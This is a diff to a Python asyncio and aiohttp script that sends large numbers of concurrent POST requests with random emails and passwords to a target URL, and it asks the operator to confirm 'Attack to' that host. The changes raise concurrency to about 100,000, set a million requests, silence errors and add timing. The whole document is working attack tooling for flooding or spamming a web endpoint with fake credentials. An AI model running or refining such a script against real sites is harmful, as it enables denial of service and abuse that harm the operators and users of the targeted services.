@@ -84,10 +84,11 @@ async def fetch(url: str, session: aiohttp.ClientSession) -> None:
         "email": create_random_email(),
         "pass": create_random_password()
     }
-
-    async with session.post(url, json=post_data) as response:
-        print(f"[{time.strftime('%c', time.localtime(time.time()))}] | POST | {url} | {response.reason}")
-
+    try:
+        async with session.post(url, json=post_data) as response:
+            print(f"[{time.strftime('%c', time.localtime(time.time()))}] | POST | {url} | {response.reason}")
+    except:
+        return
 
 async def bound_fetch(sem: asyncio.Semaphore, url: str, session: aiohttp.ClientSession):
     """
@@ -108,7 +109,7 @@ async def run(attack_times: int) -> None:
     :return: None
     """
     tasks = []
-    sem = asyncio.Semaphore(100000)
+    sem = asyncio.Semaphore(102400)
     async with aiohttp.ClientSession() as session:
         tf = input(f"Attack to {host_url} ? [Y/n] : ")
         if tf.lower() == "y":
@@ -126,7 +127,10 @@ async def run(attack_times: int) -> None:
             print("Terminated by user.")
 
 if __name__ == '__main__':
-    r = 1_000_000_000
+    r = 1_000_000
     loop = asyncio.get_event_loop()
     future = asyncio.ensure_future(run(r))
+    start = time.time()
     loop.run_until_complete(future)
+    end = time.time()
+    print(f"DONE | {round(end - start, 2)} sec")
